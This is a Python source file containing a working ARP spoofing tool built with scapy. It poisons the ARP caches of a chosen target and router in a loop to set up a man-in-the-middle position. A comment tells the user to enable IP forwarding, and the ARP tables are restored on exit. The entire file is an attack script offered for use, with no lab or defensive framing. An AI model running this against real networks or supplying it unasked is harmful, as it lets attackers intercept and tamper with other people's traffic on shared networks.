import scapy.all as scapy
import time
import itertools
import subprocess
import optparse

def arg_parse():
    parser = optparse.OptionParser()
    parser.add_option("-t", "--target", dest="target", help="Targets IP Address")
    parser.add_option("-r", "--router", dest="router", help="Routers IP Address")
    (options, arguments) = parser.parse_args()
    if not options.target:
        print("[-] Please specify targets IP, use --help for more info")
    elif not options.router:
        print("[-] Please specify routers IP, use --help for more info") 
    return options

def get_hw(ip):
    tcp_request = scapy.ARP(pdst=ip)
    broadast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broad = broadast/tcp_request
    ans = scapy.srp(arp_request_broad, timeout=1, verbose=False)[0]
    return ans[0][1].hwsrc

def spf(t_ip, spf_ip):
    target_hw=get_hw(t_ip)
    packet = scapy.ARP(op=2, pdst=t_ip, hwdst=target_hw, psrc=spf_ip) 
    scapy.send(packet, verbose=False)


def restore(ip_t, ip_src):
    mac = get_hw(ip_t)
    src_mac = get_hw(ip_src)
    packet = scapy.ARP(op=2, pdst=ip_t, hwdst=mac, psrc=ip_src, hwsrc=src_mac)
    scapy.send(packet, count=4, verbose=False
               )
#allow ip forwarding: echo 1 >/proc/sys/net/ipv4/ip_forward
if __name__ == "__main__":
    
   options = arg_parse()
   counter = lambda count=1: (num*2 for num in itertools.count(count))
   count = counter()
   if options.router and options.target != None:
       try:
           while True:
               spf(options.target, options.router)
               spf(options.router,options.target)
               print(f"\r[+] Packets sent:{next(count)}", end="\r")
               time.sleep(1.5)
       except KeyboardInterrupt:
           print("\n[-] Quitting...")  
           restore(options.target, options.router)
           restore(options.router, options.target )
